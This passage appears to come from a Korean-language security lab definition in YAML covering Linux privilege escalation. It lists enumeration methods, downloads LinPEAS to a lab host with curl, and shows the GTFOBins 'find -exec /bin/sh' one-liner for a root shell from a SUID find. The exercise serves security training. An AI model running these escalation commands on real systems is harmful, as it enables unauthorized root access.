        acceptable_methods:
          - "**[OSS] sudo -l (NOPASSWD entry)**"
          - "**[OSS] find -perm -4000 SUID**"
          - "**[OSS] getcap -r capabilities**"
          - "**[OSS] /etc/crontab + cron.d**"
          - "**[OSS] /etc/passwd / shadow 권한**"
          - "**[OSS] ssh authorized_keys**"
          - "**[OSS] systemd unit + timer**"
          - "**[OSS] kernel exploit (searchsploit linux kernel)**"
    target_vm: bastion

  - order: 2
    instruction: |
      ## 🎯 MISSION

      **LinPEAS 자동화** 시뮬 + GTFOBins 활용 시나리오.

      ## 💻 실행 명령

      ```bash
      # LinPEAS 다운로드 (실 실행은 5분+ 소요 — 시뮬)
      ssh 6v6-bastion 'curl -sL https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/linPEAS/linpeas.sh -o /tmp/linpeas.sh 2>&1 | head -3'
      ssh 6v6-bastion 'ls -la /tmp/linpeas.sh 2>/dev/null'

      # GTFOBins 시뮬 — find SUID 가 있다면 root shell 가능
      ssh 6v6-bastion 'ls -la /usr/bin/find /usr/bin/vim /usr/bin/awk 2>/dev/null | head -3'
      echo "GTFOBins 활용: find . -exec /bin/sh \\; (find 가 SUID 일 때)"
      ```

      ## 📋 확인 사항

      - LinPEAS 다운로드 (실 실행은 별 lab)
      - find / vim / awk 의 permission (SUID 여부)
      - GTFOBins 명령 예시 인지

      ## 💡 왜 이걸 하는가?

      LinPEAS 는 5 카테고리 + 100+ 점검 자동화. GTFOBins (https://gtfobins.github.io)
      는 SUID 활용 표준 cheat sheet.

      ## 🔍 결과 해석

      - **정상**: LinPEAS 다운로드 성공
      - **권한 상승**: SUID find → `find . -exec /bin/sh \;` 로 root shell
